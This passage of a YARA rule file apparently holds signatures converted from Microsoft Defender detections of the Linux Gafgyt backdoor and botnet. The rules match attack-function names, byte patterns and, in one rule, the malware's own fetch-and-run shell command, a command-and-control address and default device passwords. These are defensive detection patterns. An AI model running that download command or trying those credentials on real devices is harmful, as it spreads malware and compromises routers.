        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "attack_parser" ascii //weight: 1
        $x_1_2 = "tcp_flood" ascii //weight: 1
        $x_1_3 = "udpplain_flood" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_DD_2147915801_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.DD!MTB"
        threat_id = "2147915801"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 83 ec 08 8b 5c 24 14 ff 74 24 18 ff 73 04 ff 33 8b 44 24 1c ff 70 04 e8 f7 df ff ff 83 c4 10 85 d2 89 c1 78 ?? 89 03 31 c9 89 53 04}  //weight: 1, accuracy: Low
        $x_1_2 = {0f b1 4b 38 0f 85 a1 00 00 00 89 53 40 ff 43 3c f6 03 40 74 ?? 83 ec 0c 53 e8 22 b2 ff ff 83 c4 10 85 c0 75 ?? 83 ff 01}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_BR_2147917137_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.BR!MTB"
        threat_id = "2147917137"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 8b 44 24 14 29 d8 ba 0a 00 00 00 89 04 24 89 d1 89 f8 31 d2 f7 f1 89 c7 8b 04 24 83 c2 30 83 fb 08 88 10}  //weight: 1, accuracy: High
        $x_1_2 = {83 c8 ff 83 7d dc ff 0f 84 ?? ?? ?? ?? 8b 75 0c 8b 45 dc 01 c8 01 f7 89 cb c7 45 ec ff ff ff ff c7 45 f0 ff ff ff ff 89 45 e4 89 7d e0}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_DF_2147932283_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.DF!MTB"
        threat_id = "2147932283"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "socket_attack" ascii //weight: 1
        $x_1_2 = "bot.c" ascii //weight: 1
        $x_1_3 = "udp_attack" ascii //weight: 1
        $x_1_4 = "vse_attack" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_DF_2147932283_1
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.DF!MTB"
        threat_id = "2147932283"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_2_1 = ".sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat.sh;" ascii //weight: 2
        $x_2_2 = "92.113.29.232:81" ascii //weight: 2
        $x_1_3 = "[0mWrong password!" ascii //weight: 1
        $x_1_4 = "[0mNo shell available" ascii //weight: 1
        $x_1_5 = "telecomadmin" ascii //weight: 1
        $x_1_6 = "klv1234" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_2_*) and 3 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Gafgyt_DE_2147932896_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.DE!MTB"
        threat_id = "2147932896"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_5_1 = {65 6e 74 3a 20 22 25 73 22 0a 00 45 52 52 4f 52 20 6f 70 65 6e 69 6e 67 20 73 6f 63 6b 65 74 00 45 52 52 4f 52 20 6f 6e 20 62 69 6e 64 69 6e 67 00 45 52 52 4f 52 20 6f 6e 20 61 63 63 65 70 74 00 55 73 61 67 65 3a 20 25 73 20 5b 70 6f 72 74 5d 20 5b 74 68 72 65 61 64 73 5d 0a 00}  //weight: 5, accuracy: High
        $x_1_2 = {66 63 6e 74 6c 00 67 65 74 61 64 64 72 69 6e 66 6f 3a 20 25 73 0a 00 73 65 74 73 6f 63 6b 6f 70 74 00 43 6f 75 6c 64 20 6e 6f 74 20 62 69 6e 64 0a 00 50 49 4e 47 00 1b 5b 33 33 6d 00 3a 20 00 73 65 6e 74 20 74 6f 20 66 64 3a 20 25 64 0a 00 0d 0a 1b 5b 33 31 6d 3e 20 1b 5b 30 6d 00 0a 00}  //weight: 1, accuracy: High
        $x_1_3 = {2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 0d 0a 0d 0a 3e 20 1b 5b 30 6d 00 1b 5b 33 31 6d 3e 20 1b 5b 30 6d 00 6d 61 6e 61 67 65 6d 65 6e 74 3a 20 22 25 73 22 0a 00 45 52 52 4f 52 20 6f 70 65 6e 69 6e 67 20 73 6f 63 6b 65 74 00 45 52 52 4f 52 20 6f 6e 20 62 69 6e 64 69 6e 67 00 45 52 52 4f 52 20 6f 6e}  //weight: 1, accuracy: High
        $x_2_4 = "Bots connected" ascii //weight: 2
        $x_2_5 = "Clients connected" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_5_*) and 2 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

